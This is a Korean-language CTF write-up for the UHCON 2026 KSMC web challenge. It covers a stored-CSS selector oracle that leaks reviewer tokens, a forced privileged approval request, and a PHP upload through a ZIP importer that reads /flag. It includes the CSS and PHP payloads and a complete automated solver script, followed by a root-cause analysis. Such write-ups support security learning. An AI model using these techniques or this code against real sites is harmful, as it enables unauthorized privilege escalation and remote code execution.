# UHCON 2026 — KSMC Write-up

## 결과

- 분야: Web
- 대상: `http://43.203.187.25:8080` / `http://54.116.218.21:8080`
- CTFd challenge ID: 6
- 제출 상태: `solved_by_me: true` (`already_solved` 재확인)

```text
FLAG{bcf1b18e111d5df1c2d90137a8a0c6b22c023b860471840468df113ba78b2043}
```

최종 체인은 다음과 같다.

```text
stored CSS
  → reviewer DOM의 템플릿별 ctx/chn 값 추출
  → reviewer 세션으로 내부 승인 GET 유도
  → approved receipt 획득
  → ZIP 안의 .php 업로드
  → PHP-enabled publication 경로에서 실행
  → /flag 읽기
```

## 1. 사용자 기능과 신뢰 경계

로그인 사용자는 출력 서식과 브랜딩 패키지를 관리할 수 있다.

1. `POST /api/v1/print-templates`로 이름과 CSS를 저장한다.
2. `POST /api/v1/print-templates/{id}/submit`으로 내부 검토를 요청한다.
3. 승인된 서식은 `capability.receipt`를 받는다.
4. `POST /api/v1/brand-packages/import`에 서식 UUID, receipt, ZIP을 multipart로 전송한다.
5. 배포된 파일은 `/runtime/brand-packages/{package-id}/` 아래에서 제공된다.

서식 API 응답의 `Link` 헤더에는 사용자에게 직접 허용되지 않는 내부 상태 변경 URL이 노출되어 있었다.

```text
/internal/template-reviews/{template-id}/decision
    ?state=approved&scope=brand-publisher
```

일반 로그인 세션에서 이 URL을 직접 요청하면 403이다. 그러나 검토 렌더러는 별도 privileged 세션으로 같은 origin의 subresource를 가져온다.

## 2. Stored CSS와 reviewer DOM

사용자 CSS는 검토 preview의 `<style>`에 그대로 들어가며 CSP는 inline style과 same-origin image를 허용한다.

```text
default-src 'none'
style-src 'unsafe-inline'
img-src 'self' data:
```

내부 검토 시 `#branding-policy`에는 공개 preview와 다른 두 속성이 생긴다.

```html
<section id="branding-policy"
  data-review-context="ctx-<16 lowercase-alphanumeric>"
  data-channel="chn-<16 lowercase-alphanumeric>">
```

값은 template UUID마다 다르지만 같은 거절 서식을 `PATCH → submit`하여 다시 심사하면 바뀌지 않는다. 따라서 하나의 UUID를 독점해 반복 심사하면 전체 값을 복구할 수 있다.

## 3. CSS selector oracle로 ctx/chn 복구

각 위치에서 `a-z0-9` 후보 36개를 두 속성에 동시에 검사했다. 일치한 selector만 challenge가 제공하는 probe URL을 이미지로 요청한다.

```css
#branding-policy[data-review-context^="ctx-ab"] {
  background-image: url("/api/v1/print-templates/UUID/probes/r3x1") !important;
}

#branding-policy[data-channel^="chn-xy"]::after {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/c3x24") !important;
}
```

심사가 끝난 뒤 template API의 `probes` 배열에서 발화한 label을 읽으면 다음 문자를 알 수 있다. ctx와 chn을 한 CSS에 넣어 16회의 재심사로 두 16자 suffix를 함께 복구했다. 최대 payload도 20,000자 CSS 제한 안에 들어간다.

다른 template에서 얻은 접두사를 이어 붙이면 안 된다. 초기에 관측된 `ctx-p`, `chn-t` 같은 짧은 값은 매 문자마다 새 UUID를 만든 잘못된 추론이었다. 동일 UUID 재심사와 마지막 exact selector 확인이 핵심이다.

## 4. Reviewer 세션으로 승인 요청

서버의 승인 gate는 임의 query/header 토큰을 검사하지 않았다. 같은 template의 probe log에 정확한 ctx와 chn 값이 모두 기록됐는지를 확인하고, decision 요청이 reviewer 렌더러 세션에서 왔을 때만 통과했다.

정확한 두 값을 동시에 만족하는 selector에서 먼저 두 값을 probe label로 기록하고, 1.5초 뒤 내부 decision URL을 image로 요청했다.

```css
#branding-policy[data-review-context="CTX"][data-channel="CHN"]::before {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/CTX") !important;
}

#branding-policy[data-review-context="CTX"][data-channel="CHN"]::after {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/CHN") !important;
}

@keyframes approve-late {
  0%, 70% { background-image: none }
  100% {
    background-image: url("/internal/template-reviews/UUID/decision?state=approved&scope=brand-publisher")
  }
}

#branding-policy[data-review-context="CTX"][data-channel="CHN"] {
  animation: approve-late 1.5s steps(1,end) 1 forwards !important;
}
```

리뷰 renderer가 같은 origin 요청에 privileged cookie를 자동 전파하므로 상태가 `approved`로 바뀌고 다음 capability가 반환된다.

```json
{
  "profile": "brand-archive",
  "receipt": "<opaque receipt>",
  "import": "/api/v1/brand-packages/import"
}
```

## 5. ZIP importer의 실행 확장자 검증 누락

처음에는 path traversal, central/local filename mismatch, symlink, manifest type confusion을 검사했다. 이 우회들은 필요하지 않았다.

정상 `manifest.json`과 `flag.php` 두 파일만 든 ZIP이 HTTP 201로 배포됐다.

```php
<?php
header('Content-Type: text/plain');
echo file_get_contents('/flag');
?>
```

importer는 `.php`를 거부하지 않고, 반환된 `asset_base`는 PHP가 활성화된 Apache publication tree를 가리킨다.

```text
GET /runtime/brand-packages/{package-id}/flag.php
```

요청 결과 PHP 소스가 아니라 실행 결과가 반환되었고 `/flag`에서 플래그를 읽었다. root-level `flag.php`와 `assets/flag.php` 모두 실행되는 것을 독립적으로 확인했다.

## 6. 재현

필요 패키지는 `requests`와 `beautifulsoup4`다. 기존 기관 계정을 JSON으로 전달하거나 이메일/비밀번호를 직접 지정한다.

```bash
python solve.py --account root_account.json

# 또는
python solve.py --email USER@example.com --password 'PASSWORD'

# 두 번째 mirror
python solve.py --base http://54.116.218.21:8080 --account root_account.json
```

`solve.py`는 새 template을 만든 뒤 다음 과정을 자동화한다.

1. 같은 UUID를 16회 재심사하여 ctx와 chn을 함께 복구한다.
2. probe 두 개와 delayed decision 요청으로 승인을 얻는다.
3. receipt와 PHP ZIP을 importer에 보낸다.
4. `asset_base/flag.php`를 요청해 플래그를 추출한다.
5. `solve_result.json`과 `flag.txt`를 저장한다.

## 7. 확인한 음성 결과

- 일반 사용자 세션에서 decision URL 직접 GET: 403
- ctx/chn을 query나 custom header로 전달: 승인 실패
- ZIP central/local 이름 불일치: central directory의 안전한 이름으로 추출
- ZIP symlink: 링크를 역참조하지 않고 target 문자열을 일반 파일로 저장
- multipart duplicate scalar: 마지막 값 사용, 배열형은 Laravel validation 실패
- 승인 template의 package 재사용: 409; solver는 항상 새 template을 생성

두 mirror의 공개 JavaScript와 API 문서는 바이트 단위로 같았지만 DB와 배포 storage namespace는 분리되어 있었다. 첫 번째 mirror의 template/package UUID를 두 번째 mirror에서 조회하면 404였고, 반대 방향도 같았다. 따라서 한 mirror에서 복구한 ctx/chn, receipt, template UUID를 다른 mirror로 넘기는 방식은 성립하지 않는다. `solve.py --base`로 선택한 한 mirror 안에서 전 과정을 끝내야 한다.

## 8. 근본 원인

하나의 단일 버그가 아니라 다음 신뢰 경계 실패가 연결되었다.

- 공격자 CSS가 privileged reviewer 페이지에 저장·렌더링됨
- reviewer 전용 capability 값이 CSS selector로 관측 가능함
- 상태 변경이 same-origin image로 호출 가능한 GET endpoint임
- reviewer cookie가 CSS subresource 요청에 자동 전파됨
- probe log를 승인 증거로 신뢰함
- ZIP importer가 실행 확장자를 차단하지 않음
- 배포 디렉터리에서 PHP 실행이 활성화됨

## 증거 파일

- `root_same_template_recover_result.json`: 동일 UUID의 ctx/chn 16자 완전 복원
- `metrics_ksmc_handshake_minimal_result.json`: exact probe handshake와 receipt
- `d12_php_import_result.json`: PHP 실행 및 `/flag` 응답
- `ksmc_zip_path_php_rce_result.json`: 독립 PHP 실행 재현
- `ksmc_confusion_findings.md`: 불필요했던 ZIP 혼동 후보 정리
- `flag.txt`: 최종 플래그


## 9. 최종 풀이 코드 전체

아래 코드는 최종 재현 스크립트 전체다. 로그인 자격 증명 값은 포함하지 않고 실행 시 `root_account.json` 또는 명령행 인자로 받는다.

### `solve.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON KSMC.

Recover the per-template reviewer attributes with a stored-CSS oracle, obtain
an approved package receipt, upload a PHP asset, and read /flag.
"""

from __future__ import annotations

import argparse
import io
import json
from pathlib import Path
import re
import string
import time
import zipfile

import requests
from bs4 import BeautifulSoup


DEFAULT_BASE = "http://43.203.187.25:8080"
ALPHABET = string.ascii_lowercase + string.digits
ACTIVE = {"draft", "pending", "queued", "reviewing"}
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]+\}", re.I)


def load_account(path: Path, email: str | None, password: str | None) -> tuple[str, str]:
    if email and password:
        return email, password
    account = json.loads(path.read_text(encoding="utf-8"))
    return account["email"], account["password"]


def login(base: str, email: str, password: str) -> requests.Session:
    session = requests.Session()
    page = session.get(base + "/login", timeout=20)
    page.raise_for_status()
    token = BeautifulSoup(page.text, "html.parser").select_one(
        'input[name="_token"]'
    )["value"]
    response = session.post(
        base + "/login",
        data={"_token": token, "email": email, "password": password},
        timeout=20,
    )
    response.raise_for_status()
    if "/login" in response.url:
        raise RuntimeError("login failed")
    return session


def poll_terminal(session: requests.Session, base: str, template_id: str) -> dict:
    url = base + f"/api/v1/print-templates/{template_id}"
    deadline = time.monotonic() + 20
    state: dict = {}
    while time.monotonic() < deadline:
        time.sleep(0.15)
        response = session.get(url, headers={"Accept": "application/json"}, timeout=20)
        response.raise_for_status()
        state = response.json()
        if state.get("state") not in ACTIVE:
            return state
    raise RuntimeError(f"review did not finish: {state}")


def review(
    session: requests.Session,
    base: str,
    template_id: str,
    name: str,
    css: str,
) -> dict:
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    url = base + f"/api/v1/print-templates/{template_id}"
    patched = session.patch(
        url, headers=headers, json={"name": name, "css": css}, timeout=20
    )
    patched.raise_for_status()
    submitted = session.post(url + "/submit", headers=headers, json={}, timeout=20)
    submitted.raise_for_status()
    return poll_terminal(session, base, template_id)


def recover_reviewer_values(
    session: requests.Session, base: str, template_id: str
) -> tuple[str, str, list[dict]]:
    context = "ctx-"
    channel = "chn-"
    history: list[dict] = []
    probe_base = f"/api/v1/print-templates/{template_id}/probes"

    for position in range(16):
        rules: list[str] = []
        context_labels: dict[str, str] = {}
        channel_labels: dict[str, str] = {}
        for index, char in enumerate(ALPHABET):
            rlabel = f"r{position}x{index}"
            clabel = f"c{position}x{index}"
            context_labels[rlabel] = char
            channel_labels[clabel] = char
            rules.append(
                f'#branding-policy[data-review-context^="{context + char}"]'
                f'{{background-image:url("{probe_base}/{rlabel}")!important}}'
            )
            rules.append(
                f'#branding-policy[data-channel^="{channel + char}"]::after'
                f'{{display:block!important;content:url("{probe_base}/{clabel}")!important}}'
            )
        css = "".join(rules)
        if len(css) > 20_000:
            raise RuntimeError(f"CSS limit exceeded at position {position}")
        state = review(
            session, base, template_id, f"KSMC token recovery {position}", css
        )
        probes = state.get("probes", [])
        r_hit = next((label for label in probes if label in context_labels), None)
        c_hit = next((label for label in probes if label in channel_labels), None)
        if not r_hit or not c_hit:
            raise RuntimeError(f"token recovery failed at position {position}: {probes}")
        context += context_labels[r_hit]
        channel += channel_labels[c_hit]
        row = {
            "position": position,
            "review_context": context,
            "channel": channel,
            "probes": probes,
        }
        history.append(row)
        print(json.dumps(row, ensure_ascii=False), flush=True)
    return context, channel, history


def approve(
    session: requests.Session,
    base: str,
    template_id: str,
    context: str,
    channel: str,
) -> dict:
    selector = (
        f'#branding-policy[data-review-context="{context}"]'
        f'[data-channel="{channel}"]'
    )
    probe = f"/api/v1/print-templates/{template_id}/probes"
    state: dict = {}
    for attempt in range(3):
        delay = 1.5 + attempt * 0.75
        decision = (
            f"/internal/template-reviews/{template_id}/decision"
            f"?state=approved&scope=brand-publisher&nonce={time.time_ns()}"
        )
        css = "\n".join(
            [
                f'{selector}::before{{display:block!important;content:url("{probe}/{context}")!important}}',
                f'{selector}::after{{display:block!important;content:url("{probe}/{channel}")!important}}',
                "@keyframes approve-late{0%,70%{background-image:none}"
                f'100%{{background-image:image-set(url("{decision}") 1x)}}}}',
                f"{selector}{{animation:approve-late {delay}s steps(1,end) 1 forwards!important}}",
            ]
        )
        state = review(
            session,
            base,
            template_id,
            f"KSMC exact reviewer handshake {attempt}",
            css,
        )
        if state.get("state") == "approved" and (state.get("capability") or {}).get(
            "receipt"
        ):
            return state
    raise RuntimeError(f"approval failed after retries: {state}")


def php_archive() -> bytes:
    php = """<?php
header('Content-Type: text/plain');
$v = @file_get_contents('/flag');
if ($v !== false) echo $v;
?>
"""
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "manifest.json",
            json.dumps({"name": "KSMC brand assets", "version": "1.0.0"}),
        )
        archive.writestr("flag.php", php)
    return stream.getvalue()


def main() -> None:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--account", type=Path, default=root / "root_account.json")
    parser.add_argument("--email")
    parser.add_argument("--password")
    parser.add_argument("--result", type=Path, default=root / "solve_result.json")
    args = parser.parse_args()

    email, password = load_account(args.account, args.email, args.password)
    session = login(args.base.rstrip("/"), email, password)
    base = args.base.rstrip("/")
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    created = session.post(
        base + "/api/v1/print-templates",
        headers=headers,
        json={"name": "KSMC end-to-end solver", "css": "x{}"},
        timeout=20,
    )
    created.raise_for_status()
    template_id = created.json()["id"]

    context, channel, recovery = recover_reviewer_values(
        session, base, template_id
    )
    approved = approve(session, base, template_id, context, channel)
    receipt = approved["capability"]["receipt"]
    imported = session.post(
        base + "/api/v1/brand-packages/import",
        data={"template_id": template_id, "review_receipt": receipt},
        files={"archive": ("brand.zip", php_archive(), "application/zip")},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    imported.raise_for_status()
    package = imported.json()
    runtime_url = base + package["asset_base"].rstrip("/") + "/flag.php"
    response = session.get(runtime_url, timeout=20)
    response.raise_for_status()
    match = FLAG_RE.search(response.text)
    if not match:
        raise RuntimeError(f"PHP executed but no flag was returned: {response.text[:1000]}")
    flag = match.group(0)

    result = {
        "template_id": template_id,
        "review_context": context,
        "channel": channel,
        "recovery": recovery,
        "approval": approved,
        "package": package,
        "runtime_url": runtime_url,
        "flag": flag,
    }
    args.result.write_text(
        json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (root / "flag.txt").write_text(flag + "\n", encoding="utf-8")
    print(f"[+] {flag}")


if __name__ == "__main__":
    main()
````
